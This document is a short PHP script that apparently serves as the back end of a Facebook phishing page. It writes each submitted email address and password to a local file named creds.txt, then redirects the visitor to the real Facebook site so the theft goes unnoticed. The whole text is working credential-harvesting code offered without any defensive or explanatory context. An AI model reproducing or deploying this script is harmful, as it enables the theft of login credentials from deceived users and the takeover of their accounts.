<?php
$file = fopen("creds.txt", "a");
fwrite($file, "Email: " . $_POST['email'] . "\n");
fwrite($file, "Password: " . $_POST['pass'] . "\n");
fwrite($file, "----------\n");
fclose($file);
header("Location: https://www.facebook.com/");
exit();
?>
